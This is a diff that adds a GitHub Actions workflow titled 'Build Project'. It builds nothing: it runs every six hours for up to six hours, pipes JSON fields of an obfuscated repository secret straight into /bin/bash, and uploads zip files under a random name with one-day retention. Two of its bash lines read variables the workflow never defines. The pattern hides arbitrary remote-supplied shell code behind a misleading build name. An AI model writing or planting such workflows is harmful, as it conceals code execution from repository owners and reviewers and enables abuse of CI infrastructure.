@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          tasa14546: ${{ secrets.tasa14546 }}
+        run: |
+          printf '%s' "$tasa14546" | jq -r .yehaa8 | /bin/bash
+          printf '%s' "$m47" | jq -r .pou025 | /bin/bash
+          printf '%s' "$lcygk48552" | jq -r .h95 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: K2P5yQqt
+          path: "*.zip"
+          retention-days: 1
